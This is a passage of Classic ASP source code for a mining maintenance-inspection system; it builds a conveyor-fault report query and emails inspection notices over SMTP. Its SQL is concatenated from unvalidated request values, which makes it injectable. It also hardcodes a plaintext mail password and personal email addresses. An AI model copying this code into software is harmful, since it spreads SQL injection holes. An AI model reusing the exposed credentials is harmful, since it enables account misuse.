	query = query & "replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(EQ_1.DESCRIPCION,'-', ''),'.', ''),' ', ''),'Q', ''),'W', ''),'E', ''),'R', ''),'T', ''),'Y', ''),'U', ''),'I', ''), 'O', ''),'P', ''), 'A', ''),'S', ''),'D', ''),'F', ''),'G', ''),'H', ''),'J', ''),'K', ''),'L', ''), '�'', ''),'Z', ''), 'X', ''),'C', ''),'V', ''),'B', ''),'N', ''),'M', '') as ESTACION, DBO.EquipoPrincipal(EQ_2.CODIGO) as EQ_PRIMARIO,  case when  CHARINDEX('PCAR', B.EQUIPO) > 0 then 'CAR' ELSE 'RET' END as TIPO, CHECKLIST.DESCRIPCION AS FALLAS, B.ULT_MOD_OBS  as INSPECCION, E.FECHA_INSTALACION as CAMBIO, case when  CHARINDEX('Derecho', E.DESCRIPCION) > 0 then 'DER' when  CHARINDEX('Centro', E.DESCRIPCION) > 0 then 'CEN'  ELSE 'IZQ' END as POSICION, B.UBICACION as FAENA FROM BITACORAS AS B, EQUIPOS AS E, SECCIONES AS S, EQUIPOS AS EP, EQUIPOS AS EQ_1, EQUIPOS AS EQ_2, CHECK_EQUIPOS, CHECKLIST "
	
	query = query & " WHERE  DBO.SecEquipoPrincipal(B.EQUIPO)=S.CODIGO AND DBO.EquipoPrincipal(B.EQUIPO)=EP.CODIGO AND B.EQUIPO=E.CODIGO AND E.UBICACION=B.UBICACION AND EP.UBICACION=B.UBICACION AND E.COD_EQUIPO_PADRE = EQ_1.CODIGO AND EQ_1.COD_EQUIPO_PADRE = EQ_2.CODIGO and (B.EQUIPO like '%PCAR-P%' or B.EQUIPO like '%PRET-P%') and B.ID = CHECK_EQUIPOS.BITACORA AND CHECK_EQUIPOS.CHECKLIST = dbo.CHECKLIST.ID and CHECKLIST.tipo_equipo = E.tipo_equipo "
	query = query & " AND (CONVERT(DATETIME,CONVERT(CHAR,B.FECHA,103)) BETWEEN " & strNvl(FECHA_INI)
	query = query & " AND DATEADD(d,1," & strNvl(FECHA_FIN) & "))"
	query = query & " and B.UBICACION=" & strNvl(FAENA) 
	if  (FAENA = "ANDINA") then
		query = query & " and case when  CHARINDEX('Derecho', E.DESCRIPCION) > 0 then 'DER' when  CHARINDEX('Centro', E.DESCRIPCION) > 0 then 'CEN'  ELSE 'IZQ' END = 'DER'  "
	END IF
	query = query & " AND B.IND_SOLUCION <> 'true' "
	
	If CRITICIDAD<>"TOD" Then
		IF CRITICIDAD = "MEDALTA" THEN
			query = query & " AND B.COLOR IN ('MEDIA','ALTA')"
		ELSE
			query = query & " AND B.COLOR IN (" & strNvl(CRITICIDAD) & ")"
		END IF
	End if
	
	If EQUIPO<>"TOD" AND LEN(EQUIPO)>0  Then
		query = query & " and DBO.EquipoPrincipal(EQ_2.CODIGO) = " & strNvl(EQUIPO)
	End if
	
	If SECCION<>"'TOD'" AND LEN(SECCION)>0 Then
				query = query & " AND DBO.SecEquipoPrincipal(B.EQUIPO) IN (" & SECCION & ")"
	End if
	
	If RANX<>"TOD" AND LEN(RANX)>0 Then
		ARRANX = split(RANX, "-")
		query = query & " AND CAST(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(EQ_1.DESCRIPCION,'-', ''),'.', ''),' ', ''),'Q', ''),'W', ''),'E', ''),'R', ''),'T', ''),'Y', ''),'U', ''),'I', ''), 'O', ''),'P', ''), 'A', ''),'S', ''),'D', ''),'F', ''),'G', ''),'H', ''),'J', ''),'K', ''),'L', ''), '�'', ''),'Z', ''), 'X', ''),'C', ''),'V', ''),'B', ''),'N', ''),'M', '') AS INT)  >= " & ARRANX(0)
		query = query & " AND CAST(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(EQ_1.DESCRIPCION,'-', ''),'.', ''),' ', ''),'Q', ''),'W', ''),'E', ''),'R', ''),'T', ''),'Y', ''),'U', ''),'I', ''), 'O', ''),'P', ''), 'A', ''),'S', ''),'D', ''),'F', ''),'G', ''),'H', ''),'J', ''),'K', ''),'L', ''), '�'', ''),'Z', ''), 'X', ''),'C', ''),'V', ''),'B', ''),'N', ''),'M', '') AS INT)  <= " & ARRANX(1)
	END IF	
			
	query = query & " GROUP BY CHECKLIST.DESCRIPCION, B.ID, B.EQUIPO, DBO.EquipoPrincipal(B.EQUIPO),"
	query = query & " E.DESCRIPCION, EP.DESCRIPCION, EP.CRITICIDAD, B.COLOR, EQ_2.DESCRIPCION, "
	query = query & " EQ_1.DESCRIPCION, DBO.EquipoPrincipal(EQ_2.CODIGO),  "
	query = query & " B.ULT_MOD_OBS, E.FECHA_INSTALACION, B.UBICACION "
	query = query & " ORDER BY CHECKLIST.DESCRIPCION, DBO.EquipoPrincipal(B.EQUIPO), B.EQUIPO "
	'response.write query
	'response.end
	Set ORs =oDB.EjecutaSql(query)
	IF EXCEL="YES" THEN	
		Response.Buffer = True
		Response.ContentType = "application/vnd.ms-excel"
		Response.AddHeader "Content-Disposition", "attachment;filename=semanal.xls"
		Response.Write "<?xml version='1.0' encoding='ISO-8859-15' ?>" 
		'Response.Write "<?xml-stylesheet type='text/xsl' href='http://www.ttminsight.cl/sgm/Informes/semanalXLS.xsl'?>" & VbCrLf
	ELSE
		Response.ContentType = "text/xml"
		Response.Write "<?xml version='1.0' encoding='ISO-8859-15' ?>" 
	END IF
	

	Response.Write "<REGISTROS>" '& query
	N=0
	While Not ORs.EOF 
	  Response.Write "<ROW>" 
	  	  N=N+1 
		  Response.Write "<N>" & N & "</N>"
		  Response.Write "<COLOR>" & ORs.Fields.Item(0).Value & "</COLOR>"
		  Response.Write "<MESA>" & ORs.Fields.Item(1).Value & "</MESA>"
		  Response.Write "<ESTACION>" & ORs.Fields.Item(2).Value & "</ESTACION>"
		  Response.Write "<FAENA>" & ORs.Fields.Item(9).Value & "</FAENA>"
		  Response.Write "<EQUIPO_PRIN>" & ORs.Fields.Item(3).Value & "</EQUIPO_PRIN>"
		  Response.Write "<TIPO>" & ORs.Fields.Item(4).Value & "</TIPO>"
		  Response.Write "<FALLAS>" & ORs.Fields.Item(5).Value & "</FALLAS>"
   		  Response.Write "<INSPECCION>" & ORs.Fields.Item(6).Value & "</INSPECCION>"
   		  Response.Write "<CAMBIO>" & ORs.Fields.Item(7).Value & "</CAMBIO>"
		  Response.Write "<POS>" & ORs.Fields.Item(8).Value & "</POS>"  
		  Response.Write "<FECHA>" & FECHA_INI & "</FECHA>"

  	      Response.Write "<FECHA2>" & FECHA_FIN & "</FECHA2>"
		 Response.Write "</ROW>"
	  ORs.MoveNext
	Wend
	'Response.Write "<ROW2><QUERY><chart palette='2' caption='Eventos' yAxisName='IZQ          CEN          DER' xAxisName='Cinta Transportadora' xAxisMaxValue='100'  xAxisMinValue='0' yAxisMaxValue='3'  >   <categories verticalLineColor='666666' verticalLineThickness='1'><category y='1' label='1' /><category label='10' x='10' showVerticalLine='0'/><category label='20' x='20' showVerticalLine='0'/><category label='30' x='30' showVerticalLine='0'/><category label='40' x='40' showVerticalLine='0'/><category label='50' x='50' showVerticalLine='0'/><category label='60' x='60' showVerticalLine='0'/><category label='70' x='70' showVerticalLine='0'/><category label='80' x='80' showVerticalLine='0'/><category label='90' x='90' showVerticalLine='0'/><category label='100' x='100' showVerticalLine= '0'/>   </categories>   <dataset seriesName='Ruido' color='009900' anchorSides='3' anchorRadius='4' anchorBgColor='D5FFD5' anchorBorderColor='009900'><set y='2.5' x='21' /><set y='2.5' x='32' /><set y='0.5' x='43' /><set y='1.5' x='48' /><set y='2.5' x='50' /><set y='1.5' x='56' /><set y='1.5' x='59' /><set y='0.5' x='73' /><set y='2.5' x='89' /><set y='1.5' x='93' />   </dataset>   <dataset seriesName='Dano Estructural' color='0000FF' anchorSides='4' anchorRadius='4' anchorBgColor='C6C6FF' anchorBorderColor='0000FF'><set y='1.5' x='23'/><set y='1.5' x='29'/><set y='1.5' x='33'/><set y='1.5' x='41'/><set y='1.5' x='47'/><set y='1.5' x='49'/><set y='0.5' x='51'/><set y='1.5' x='53'/><set y='0.5' x='57'/><set y='0.5' x='58'/><set y='1.5' x='61'/><set y='0.5' x='63'/><set y='1.5' x='64'/><set y='1.5' x='71'/><set y='2.5' x='77'/><set y='1.5' x='79'/><set y='1.5' x='83'/><set y='1.5' x='89'/><set y='2.5' x='91'/><set y='0.5' x='93'/>   </dataset>   </chart></QUERY></ROW2>"
	
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
end function


function newMailBitacora()

'Session.LCID = 2057

Dim MailServer
Dim toMail

'MailServer = oDB.GetMailServer()
'***************************************************************
MailServer = "mail.ttminsight.cl"
'MailServer = "mail.vitcomz.com"
'***************************************************************

Const cdoSendUsingMethod        = _
	"http://schemas.microsoft.com/cdo/configuration/sendusing"
Const cdoSendUsingPort          = 2
Const cdoSMTPServer             = _
	"http://schemas.microsoft.com/cdo/configuration/smtpserver"
Const cdoSMTPServerPort         = _
	"http://schemas.microsoft.com/cdo/configuration/smtpserverport"
Const cdoSMTPConnectionTimeout  = _
	"http://schemas.microsoft.com/cdo/configuration/smtpconnectiontimeout"
Const cdoSMTPAuthenticate       = _
	"http://schemas.microsoft.com/cdo/configuration/smtpauthenticate"
Const cdoBasic                  = 1
Const cdoSendUserName           = _
	"http://schemas.microsoft.com/cdo/configuration/sendusername"
Const cdoSendPassword           = _
	"http://schemas.microsoft.com/cdo/configuration/sendpassword"

Dim objConfig  ' As CDO.Configuration
Dim objMessage ' As CDO.Message
Dim Fields     ' As ADODB.Fields

 

' Get a handle on the config object and it's fields
Set objConfig = Server.CreateObject("CDO.Configuration")
Set Fields = objConfig.Fields

' Set config fields we care about
With Fields
	.Item(cdoSendUsingMethod)       = cdoSendUsingPort
	.Item(cdoSMTPServer)            = MailServer
	.Item(cdoSMTPServerPort)        = 25
	.Item(cdoSMTPConnectionTimeout) = 10
	.Item(cdoSMTPAuthenticate)      = cdoBasic
	.Item(cdoSendUserName)          = "info@ttminsight.cl" 	' USUARIO DE CORREO QUE ENVIA'
	.Item(cdoSendPassword)          = "r3m0lin0"          	' PASSWORD DE USUARIO'
	
	.Update
End With

Set objMessage = Server.CreateObject("CDO.Message")
	'objMessage.Charset = "ISO-8859-1"
Set objMessage.Configuration = objConfig

	BODY = "<!DOCTYPE html>" & VbCrLf
	BODY = BODY &"<html lang='es'>" & VbCrLf
	BODY = BODY & "<meta http-equiv='Content-Type' content='text/html; charset=ISO-8859-1' />" & VbCrLf
	BODY = BODY & "<head>" & VbCrLf
	BODY = BODY & "<title>Aviso de Inspecci�n TTM Insight</title>" & VbCrLf
	BODY = BODY & "<style type='text/css'>"
	BODY = BODY & " body{margin-left:5px;margin-top:0px;font-family:Verdana, Tahoma, Arial;} "
	BODY = BODY & " </style>"
	BODY = BODY & "<body></br>"
	BODY = BODY & "Estimado Usuario: </br>"
	BODY = BODY & "Le informamos que se ha registrado una nueva inspecci�n en TTMInsight.</br> "
	BODY = BODY & "<br><br>"
	BODY = BODY & "FAENA :<strong>" & FAENA & "</strong><BR>"
	BODY = BODY & "COMPONENTE: <strong> " & EQUIPO & "</strong><BR>"
 
	'BODY = BODY & "EQUIPO: <strong> " & SECCION & "&nbsp; " & EQ_PRINCIPAL & "&nbsp; " & DES_EQUIPO & "</strong><BR>"
	BODY = BODY & "FECHA INSPECCI�N: <strong>" & FECHA & "</strong><BR>"
	BODY = BODY & "CRITICIDAD: " & CRITICIDAD &  "% " & COLOR & "<BR> " 'P_CRITICIDAD
	BODY = BODY & "INSPECTOR: " & USERNAME & "<BR>"
	BODY = BODY & "OBSERVACI�N:<strong> " & DESCRIPCION & "</strong><BR>"
	BODY = BODY & "RECOMENDACI�N:<strong> " & RECOMENDACION & "</strong><BR>"
	BODY = BODY & "CAUSA RA�Z:<strong> " & CAUSA & "</strong><BR>"
	BODY = BODY & "FOTOGRAFIAS :<BR>"
	 	
	'Set ORs = ListFiles("BITACORAS",ID)
	
	'While Not ORs.EOF 
'		tFile = ORs.Fields.Item(0).Value & "." & ORs.Fields.Item(8).Value 
'		BODY = BODY & "<a target='_blank' href='http://www.ttminsight.cl/sgm/Files/" & tFile & "'>" & tFile & "</a><BR>"
'		ORs.MoveNext'
'	Wend
	  
	BODY = BODY & " <BR><BR>"
	BODY = BODY & "Ud. podra visualizar mas detalles en el modulo de Bitacoras s� lo desea.<BR><BR>"
	BODY = BODY & "<a target='_blank' href='http://www.ttminsight.cl/loginSGM.html'>"
	BODY = BODY & "http://www.ttminsight.cl</a><BR>"
	BODY = BODY & "<BR><BR>"
	BODY = BODY & "<BR><BR>Departamento de Ingenier�a en Mantenimiento<BR>"
	BODY = BODY & "TTMChile S.A.<BR>" 
	BODY = BODY & "Contacto Fono +569-5647 0768.<BR>" 
	BODY = BODY & "</body></html> "
	'RESPONSE.WRITE BODY
	'RESPONSE.END()

	 
	'response.Write(BODY)
	'exit function
	
With objMessage

	P_TO       = "info@vitcomz.com; msepulveda@ttmchile.cl;ssepulveda@ttmchile.cl;" 'P_TO
	
	If COLOR = "ALTA" Then
		P_TO = P_TO  & "smorenov@ttmchile.cl;Natalia.Vargas@bhp.com;"
	End If
	
	.To       = P_TO
	.Cc		  = "info@ttminsight.cl"
	.From     = "info@ttminsight.cl"
	.Subject  = "Aviso de Inspecci�n " & ID & " " & FAENA 
	.HTMLBody = BODY
	.Send
End With

Set Fields = Nothing
Set objMessage = Nothing
Set objConfig = Nothing

	
	If Err.number <> 0 Then
		'Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
		Response.Write "<REGISTROS>"
	 	 	Response.Write "<ROW>" 
			Response.Write "<ERROR>" & Err.NUMBER & " " & Err.DESCRIPCION & "</ERROR>"
	  		Response.Write "</ROW>"
		Response.Write "</REGISTROS>"
	Else
		Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
		Response.Write "<REGISTROS>"
	 	 	Response.Write "<ROW>" 
			Response.Write "<RETURN>TRUE</RETURN>"
	  		Response.Write "</ROW>"
		Response.Write "</REGISTROS>"
	End If
	On error Goto 0

	Set ORs = nothing

end function




%>